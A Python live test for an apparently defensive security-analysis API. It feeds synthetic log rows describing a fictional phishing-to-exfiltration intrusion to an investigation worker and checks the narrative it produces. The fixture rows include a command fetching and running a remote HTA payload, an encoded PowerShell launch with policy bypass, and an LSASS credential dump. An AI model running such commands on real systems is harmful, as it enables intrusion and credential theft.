"""P0 Live Test: investigate/build worker end-to-end verification.

Verifies that _start_investigate_worker properly drains INVESTIGATE_QUEUE
after the lifespan wiring fix.

Usage:
    python tests/p0_live_test.py [--model qwen2.5:14b] [--timeout 120]
"""
import argparse
import json
import sys
import time
import urllib.request
import urllib.error

BASE = "http://localhost:8765"

# Compact PHANTOM-MERIDIAN-style dataset: InitialAccess→Exec→CredAccess→Lateral→Exfil chain
PHANTOM_ROWS = [
    {
        "id": "pm-001", "log_source": "email", "event_type": "phishing_link_clicked",
        "user": "alice.chen@meridian.corp", "src_ip": "185.220.101.45",
        "host": "WS-ALICE-01", "ts": "2026-04-17T08:12:00Z",
        "analyst_notes": "Clicked link in spoofed IT reset email → browser spawned mshta.exe",
        "severity": "high", "mitre_technique": "T1566.002",
    },
    {
        "id": "pm-002", "log_source": "endpoint", "event_type": "process_spawn",
        "user": "alice.chen@meridian.corp", "src_ip": "10.0.10.45",
        "host": "WS-ALICE-01", "ts": "2026-04-17T08:12:42Z",
        "process": "mshta.exe", "parent_process": "chrome.exe",
        "command_line": "mshta.exe http://185.220.101.45/payload.hta",
        "analyst_notes": "HTML Application spawned from browser, remote payload",
        "severity": "critical", "mitre_technique": "T1218.005",
    },
    {
        "id": "pm-003", "log_source": "endpoint", "event_type": "powershell_execution",
        "user": "alice.chen@meridian.corp", "src_ip": "10.0.10.45",
        "host": "WS-ALICE-01", "ts": "2026-04-17T08:13:05Z",
        "process": "powershell.exe", "parent_process": "mshta.exe",
        "command_line": "powershell -ep bypass -enc QABQAGEAcgBzAGUA...",
        "analyst_notes": "Base64 encoded PS spawned by mshta — downloads stage-2",
        "severity": "critical", "mitre_technique": "T1059.001",
    },
    {
        "id": "pm-004", "log_source": "endpoint", "event_type": "lsass_access",
        "user": "alice.chen@meridian.corp", "src_ip": "10.0.10.45",
        "host": "WS-ALICE-01", "ts": "2026-04-17T08:14:30Z",
        "process": "procdump.exe", "target_process": "lsass.exe",
        "analyst_notes": "procdump targeting LSASS — credential extraction",
        "severity": "critical", "mitre_technique": "T1003.001",
    },
    {
        "id": "pm-005", "log_source": "ad", "event_type": "kerberoasting_burst",
        "user": "alice.chen@meridian.corp", "src_ip": "10.0.10.45",
        "host": "WS-ALICE-01", "ts": "2026-04-17T08:15:00Z",
        "spn_count": 14, "ticket_type": "RC4_HMAC",
        "analyst_notes": "14 SPN TGS requests in 60s — Kerberoasting pattern",
        "severity": "critical", "mitre_technique": "T1558.003",
    },
    {
        "id": "pm-006", "log_source": "network", "event_type": "smb_lateral_burst",
        "user": "svc-backup@meridian.corp", "src_ip": "10.0.10.45",
        "dst_ip": "10.0.20.12", "host": "WS-ALICE-01", "ts": "2026-04-17T08:22:10Z",
        "smb_share": "ADMIN$", "conn_count": 9,
        "analyst_notes": "Lateral SMB ADMIN$ from Alice's workstation using harvested svc-backup creds",
        "severity": "critical", "mitre_technique": "T1021.002",
    },
    {
        "id": "pm-007", "log_source": "network", "event_type": "dns_tunnel_exfil",
        "user": "svc-backup@meridian.corp", "src_ip": "10.0.20.12",
        "dst_ip": "185.220.101.45", "host": "SRV-BACKUP-02", "ts": "2026-04-17T08:35:00Z",
        "query_entropy": 4.8, "query_len_avg": 62,
        "analyst_notes": "High-entropy DNS TXT queries to C2 — staged exfil via DNS tunnel",
        "severity": "critical", "mitre_technique": "T1048.003",
    },
    {
        "id": "pm-008", "log_source": "cloud", "event_type": "new_access_key_created",
        "user": "svc-backup@meridian.corp", "src_ip": "10.0.20.12",
        "host": "SRV-BACKUP-02", "ts": "2026-04-17T08:40:00Z",
        "cloud_provider": "AWS", "iam_user": "svc-backup",
        "analyst_notes": "New IAM key created from compromised backup server — persistence",
        "severity": "critical", "mitre_technique": "T1098.001",
    },
]


HEADERS = {
    "Content-Type": "application/json",
    "X-Tenant-ID": "phantom_meridian",
}


def api(method: str, path: str, body=None, timeout: int = 30):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers=HEADERS)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return {"error": e.code, "detail": e.read().decode()[:300]}
    except Exception as e:
        return {"error": str(e)}


def run_p0(model: str = "qwen2.5:14b", timeout: int = 120):
    print(f"\n=== P0 Live Test: investigate/build worker ===")
    print(f"Model: {model} | Timeout: {timeout}s | Rows: {len(PHANTOM_ROWS)}\n")

    # 1. Health check
    health = api("GET", "/health")
    if "error" in health:
        print(f"FAIL: Server not reachable — {health}")
        sys.exit(1)
    print(f"[health] status={health.get('status')} llm={health.get('llm',{}).get('ollama_model')}")

    # 2. Submit rows to deep_analyze
    t0 = time.time()
    print(f"\n[1] Submitting {len(PHANTOM_ROWS)} rows to /api/v1/csv/deep_analyze ...")
    da_resp = api("POST", "/api/v1/csv/deep_analyze",
                  {"rows": PHANTOM_ROWS, "org": "phantom_meridian", "auto_llm": True},
                  timeout=60)
    if "error" in da_resp:
        print(f"FAIL deep_analyze: {da_resp}")
        sys.exit(1)
    assessment_id = da_resp.get("assessment_id") or da_resp.get("id")
    print(f"  assessment_id: {assessment_id}")
    print(f"  clusters: {len(da_resp.get('clusters', []))}")
    print(f"  elapsed: {time.time()-t0:.1f}s")

    if not assessment_id:
        print("FAIL: no assessment_id in response")
        print(json.dumps(da_resp, indent=2)[:800])
        sys.exit(1)

    # 3. Trigger investigate/build
    t1 = time.time()
    print(f"\n[2] Calling POST /assessments/{assessment_id}/investigate/build ...")
    build_resp = api("POST", f"/api/v1/assessments/{assessment_id}/investigate/build",
                     {"model": model, "max_tokens": 3000}, timeout=30)
    if "error" in build_resp:
        print(f"FAIL build: {build_resp}")
        sys.exit(1)
    investigate_id = build_resp.get("investigate_id")
    status = build_resp.get("status")
    print(f"  investigate_id: {investigate_id}")
    print(f"  initial status: {status}")

    if not investigate_id:
        print("FAIL: no investigate_id")
        print(json.dumps(build_resp, indent=2)[:600])
        sys.exit(1)

    # 4. Poll until ready
    print(f"\n[3] Polling status (max {timeout}s) ...")
    interval = 4
    elapsed = 0
    final_status = status
    while elapsed < timeout:
        time.sleep(interval)
        elapsed += interval
        poll = api("GET", f"/api/v1/assessments/{assessment_id}/investigate/{investigate_id}")
        final_status = poll.get("status", "unknown")
        print(f"  [{elapsed:3d}s] status={final_status}")
        if final_status in {"ready", "error", "failed"}:
            break

    total = time.time() - t1
    print(f"\n  Total latency: {total:.1f}s")

    if final_status != "ready":
        print(f"\nFAIL: status={final_status} after {timeout}s — worker may not be running")
        # Print last poll detail
        poll = api("GET", f"/api/v1/assessments/{assessment_id}/investigate/{investigate_id}")
        print(json.dumps(poll, indent=2)[:800])
        sys.exit(1)

    # 5. Quality assertions
    print(f"\n[4] Quality check ...")
    result = api("GET", f"/api/v1/assessments/{assessment_id}/investigate/{investigate_id}")
    narrative = result.get("narrative") or result.get("summary") or ""
    tasks = result.get("tasks") or []
    mitre_ids = result.get("mitre_ids") or []

    print(f"  Narrative length: {len(narrative)} chars")
    print(f"  Tasks: {len(tasks)}")
    print(f"  MITRE IDs: {mitre_ids[:5]}")
    print(f"\n--- Narrative (first 800 chars) ---")
    print(narrative[:800])
    print("---")

    # Basic quality gates
    assert len(narrative) >= 200, f"Narrative too short: {len(narrative)} chars"
    if len(tasks) == 0:
        print(f"  WARNING: no structured tasks generated (narrative quality still OK)")
    print(f"\nPASS: investigate/build completed in {total:.1f}s, {len(tasks)} tasks, {len(narrative)} char narrative")

    return {"assessment_id": assessment_id, "investigate_id": investigate_id,
            "latency_s": round(total, 1), "tasks": len(tasks), "narrative_len": len(narrative)}


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--model", default="qwen2.5:14b")
    parser.add_argument("--timeout", type=int, default=120)
    args = parser.parse_args()
    result = run_p0(model=args.model, timeout=args.timeout)
    print(f"\nResult: {json.dumps(result, indent=2)}")
